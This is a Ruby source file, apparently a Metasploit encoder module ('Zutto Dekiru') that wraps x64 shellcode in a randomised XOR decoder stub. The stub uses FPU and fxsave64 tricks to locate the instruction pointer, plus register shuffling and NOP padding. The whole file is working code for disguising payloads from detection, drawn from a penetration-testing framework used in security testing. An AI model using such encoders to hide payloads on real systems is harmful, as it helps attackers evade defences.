##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'
require 'rex/nop/opty2'

class MetasploitModule < Msf::Encoder::Xor
  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'Zutto Dekiru',
      'Version'          => '$Revision: 14774 $',
      'Description'      => 'Inspired by shikata_ga_nai using fxsave64 to work under x64 systems.',
      'Author'           => 'agix',
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::Raw,
      'Decoder'          =>
      {
        'KeySize'    => 8,
        'KeyPack'    => 'Q<'
      }
    )
  end

  @@cpu64 = Metasm::X86_64.new
  def assemble(src, cpu=@@cpu64)
    Metasm::Shellcode.assemble(cpu, src).encode_string
  end


  def fxsave64(reg)
    case reg
    when "rax"
      return "\x48\x0f\xae\x00"
    when "rbx"
      return "\x48\x0f\xae\x03"
    when "rcx"
      return "\x48\x0f\xae\x01"
    when "rdx"
      return "\x48\x0f\xae\x02"
    when "rsi"
      return "\x48\x0f\xae\x06"
    when "rdi"
      return "\x48\x0f\xae\x07"
    when "rbp"
      return "\x48\x0f\xae\x45\x00"
    when "r8"
      return "\x49\x0f\xae\x00"
    when "r9"
      return "\x49\x0f\xae\x01"
    when "r10"
      return "\x49\x0f\xae\x02"
    when "r11"
      return "\x49\x0f\xae\x03"
    when "r12"
      return "\x49\x0f\xae\x04\x24"
    when "r13"
      return "\x49\x0f\xae\x45\x00"
    when "r14"
      return "\x49\x0f\xae\x06"
    when "r15"
      return "\x49\x0f\xae\x07"
    end
  end

  def nop(length,save_registers=[])
    test = Rex::Nop::Opty2.new('',save_registers)
    return test.generate_sled(length)
  end

  # Indicate that this module can preserve some registers
  def can_preserve_registers?
    true
  end
  #
  # Returns the set of FPU instructions that can be used for the FPU block of
  # the decoder stub.
  #
  def fpu_instructions
    fpus = []

    0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
    0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
    0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }

    fpus << "\xd9\xd0"
    fpus << "\xd9\xe1"
    fpus << "\xd9\xf6"
    fpus << "\xd9\xf7"
    fpus << "\xd9\xe5"

    # This FPU instruction seems to fail consistently on Linux
    #fpus << "\xdb\xe1"

    fpus
  end

  def rand_string(length)
    o = [('0'..'9'),('a'..'z'),('A'..'Z')].map{|i| i.to_a}.flatten;
    string = (0..(length-1)).map{ o[rand(o.length)] }.join;

    return string
  end

  def xor_string(text,key)
    text.length.times {|n| text[n] = (text[n].ord^key[n.modulo(key.length)].ord).chr }
    return text
  end


  def ordered_random_merge(a,b)
    a, b = a.dup, b.dup
    a.map{rand(b.size+1)}.sort.reverse.each do |index|
      b.insert(index, a.pop)
    end
    b
  end

  def encode_block(state, block)
    allowed_reg = [
      ["rax",  "eax",  "ax",   "al"  ],
      ["rbx",  "ebx",  "bx",   "bl"  ],
      ["rcx",  "ecx",  "cx",   "cl"  ],
      ["rdx",  "edx",  "dx",   "dl"  ],
      ["rsi",  "esi",  "si",   "sil" ],
      ["rdi",  "edi",  "di",   "dil" ],
      ["rbp",  "ebp",  "bp",   "bpl" ],
      ["r8",   "r8d",  "r8w",  "r8b" ],
      ["r9",   "r9d",  "r9w",  "r9b" ],
      ["r10",  "r10d", "r10w", "r10b"],
      ["r11",  "r11d", "r11w", "r11b"],
      ["r12",  "r12d", "r12w", "r12b"],
      ["r13",  "r13d", "r13w", "r13b"],
      ["r14",  "r14d", "r14w", "r14b"],
      ["r15",  "r15d", "r15w", "r15b"],
    ]
    allowed_reg.delete_if { |reg| datastore['SaveRegisters'] && datastore['SaveRegisters'].include?(reg.first) }
    allowed_reg.shuffle!

    if block.length%8 != 0
      block += nop(8-(block.length%8))
    end

    reg_type = 3

    if (block.length/8) > 0xff
      reg_type = 2
    end

    if (block.length/8) > 0xffff
      reg_type = 1
    end

    if (block.length/8) > 0xffffffff
      reg_type = 0
    end

    reg_key  = allowed_reg[0][0]
    reg_size = allowed_reg[3]
    reg_rip  = allowed_reg[1][0]
    reg_env  = allowed_reg[2]

    flip_coin = rand(2)

    fpu_opcode = Rex::Poly::LogicalBlock.new('fpu',
                                            *fpu_instructions)

    fpu = []
    fpu << ["fpu",fpu_opcode.generate([], nil, state.badchars)]

    sub = (rand(0xd00)&0xfff0)+0xf000
    lea = []
    if flip_coin==0
      lea << ["lea",  assemble("mov %s, rsp"%reg_env[0])]
      lea << ["lea1", assemble("and "+reg_env[2]+", 0x%x"%sub)]
    else
      lea << ["lea",  assemble("push rsp")]
      lea << ["lea1", assemble("pop "+reg_env[0])]
      lea << ["lea2", assemble("and "+reg_env[2]+", 0x%x"%sub)]
    end

    fpu_lea = ordered_random_merge(fpu, lea)
    fpu_lea << ["fpu1", fxsave64(reg_env[0])] # fxsave64 doesn't seem to exist in metasm

    key_ins = [["key",  assemble("mov "+reg_key+", 0x%x"%state.key)]]

    size = []
    size << ["size", assemble("xor "+reg_size[0]+", "+reg_size[0])]
    size << ["size", assemble("mov "+reg_size[reg_type]+", 0x%x"% (block.length/8))]

    getrip=0

    a = ordered_random_merge(size, key_ins)
    decode_head_tab = ordered_random_merge(a, fpu_lea)

    decode_head_tab.length.times { |i| getrip = i if decode_head_tab[i][0] == "fpu"}

    decode_head = decode_head_tab.map { |j,i| i.to_s }.join

    flip_coin = rand(2)

    if flip_coin==0
      decode_head += assemble("mov "+reg_rip+", ["+reg_env[0]+" + 0x8]")
    else
      decode_head += assemble("add "+reg_env[0]+", 0x8")
      decode_head += assemble("mov "+reg_rip+", ["+reg_env[0]+"]")
    end


    decode_head_size = decode_head.length
    getrip.times { |i| decode_head_size -= decode_head_tab[i][1].length }

    loop_code =  assemble("dec "+reg_size[0])
    loop_code += assemble("xor ["+reg_rip+"+("+reg_size[0]+"*8) + 0x7f], "+reg_key)
    loop_code += assemble("test "+reg_size[0]+", "+reg_size[0])

    payload_offset = decode_head_size+loop_code.length+2

    loop_code =  assemble("dec "+reg_size[0])
    loop_code += assemble("xor ["+reg_rip+"+("+reg_size[0]+"*8) + 0x"+payload_offset.to_s(16)+"], "+reg_key)
    loop_code += assemble("test "+reg_size[0]+", "+reg_size[0])

    jnz = "\x75"+(0x100-(loop_code.length+2)).chr

    decode = decode_head+loop_code+jnz
    encode = xor_string(block, [state.key].pack('Q'))

    return decode + encode
  end


end
